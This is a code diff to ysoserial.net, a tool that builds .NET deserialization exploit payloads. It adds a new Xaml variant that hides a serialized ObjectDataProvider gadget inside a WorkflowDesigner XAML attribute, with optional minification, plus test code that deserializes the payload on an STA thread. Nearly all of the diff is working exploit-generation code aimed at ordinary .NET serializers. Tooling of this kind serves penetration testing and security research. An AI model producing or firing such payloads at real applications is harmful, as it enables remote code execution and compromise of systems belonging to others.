@@ -29,7 +29,7 @@ namespace ysoserial.Generators
 
         public override List<string> SupportedFormatters()
         {
-            return new List<string> { "Xaml (3)", "Json.Net", "FastJson", "JavaScriptSerializer", "XmlSerializer", "DataContractSerializer (2)", "YamlDotNet < 5.0.0", "FsPickler" };
+            return new List<string> { "Xaml (4)", "Json.Net", "FastJson", "JavaScriptSerializer", "XmlSerializer", "DataContractSerializer (2)", "YamlDotNet < 5.0.0", "FsPickler" };
         }
 
         public override OptionSet Options()
@@ -50,7 +50,7 @@ namespace ysoserial.Generators
 
         public override string Finders()
         {
-            return "Oleksandr Mirosh and Alvaro Munoz";
+            return "Oleksandr Mirosh, Alvaro Munoz";
         }
 
         public override string Contributors()
@@ -91,7 +91,7 @@ namespace ysoserial.Generators
                 {
                     ResourceDictionary myResourceDictionary = new ResourceDictionary();
                     myResourceDictionary.Add("", odp);
-                    //payload = XamlWriter.Save(myResourceDictionary);
+                    // XAML serializer can also be exploited!
                     payload = SerializersHelper.Xaml_serialize(myResourceDictionary);
 
                 }
@@ -103,9 +103,26 @@ namespace ysoserial.Generators
                         Console.WriteLine("Try 'ysoserial --fullhelp' for more information.");
                         System.Environment.Exit(-1);
                     }
-                    
+
+                    // There are loads of other objects in Presentation that use XAML URLs and they can be used here instead
                     payload = @"<ResourceDictionary xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation"" Source=""" + xaml_url + @"""/>";
+
                     
+                }
+                else if (variant_number == 4)
+                {
+                    inputArgs.IsSTAThread = true; // we need STAThreadAttribute here
+                    string bridge = SerializersHelper.Xaml_serialize(odp);
+
+                    if (inputArgs.Minify)
+                    {
+                        // using discardable regex array to make it shorter!
+                        bridge = XMLMinifier.Minify(bridge, null, new String[] { @"StandardErrorEncoding=.*LoadUserProfile=""False"" ", @"IsInitialLoadEnabled=""False"" " });
+                    }
+
+                    // There are loads of other objects in Presentation that use ResourceDictionary and they can all be used here instead
+                    payload = @"<WorkflowDesigner xmlns=""clr-namespace:System.Activities.Presentation;assembly=System.Activities.Presentation"" PropertyInspectorFontAndColorData=""" + CommandArgSplitter.XmlStringAttributeEscape(bridge) + @"""/>"; 
+
                 }
                 else
                 {
@@ -121,14 +138,34 @@ namespace ysoserial.Generators
 
                 if (inputArgs.Test)
                 {
-                    try
+                    if (inputArgs.IsSTAThread)
                     {
-                        SerializersHelper.Xaml_deserialize(payload);
+                        var staThread = new System.Threading.Thread(delegate ()
+                        {
+                            try {
+                                SerializersHelper.Xaml_deserialize(payload);
+                            }
+                            catch (Exception err)
+                            {
+                                Debugging.ShowErrors(inputArgs, err);
+                            }
+
+                        });
+                        staThread.SetApartmentState(System.Threading.ApartmentState.STA);
+                        staThread.Start();
+                        staThread.Join();
                     }
-                    catch (Exception err)
+                    else
                     {
-                        Debugging.ShowErrors(inputArgs, err);
-                    }
+                        try
+                        {
+                            SerializersHelper.Xaml_deserialize(payload);
+                        }
+                        catch (Exception err)
+                        {
+                            Debugging.ShowErrors(inputArgs, err);
+                        }
+                    }   
                 }
                 return payload;
             }
